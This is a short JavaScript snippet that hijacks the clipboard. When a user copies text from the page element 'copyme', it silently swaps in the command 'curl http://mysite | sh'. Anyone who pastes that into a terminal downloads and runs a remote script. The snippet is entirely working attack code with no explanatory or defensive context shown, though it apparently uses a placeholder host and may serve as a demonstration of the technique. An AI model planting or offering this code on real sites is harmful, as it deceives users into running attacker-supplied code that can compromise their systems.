document.getElementById('copyme').addEventListener(
    'copy', function(e){
        e.clipboardData.setData('text/plain',
        'curl http://mysite | sh\n');
        e.preventDefault();
    }
)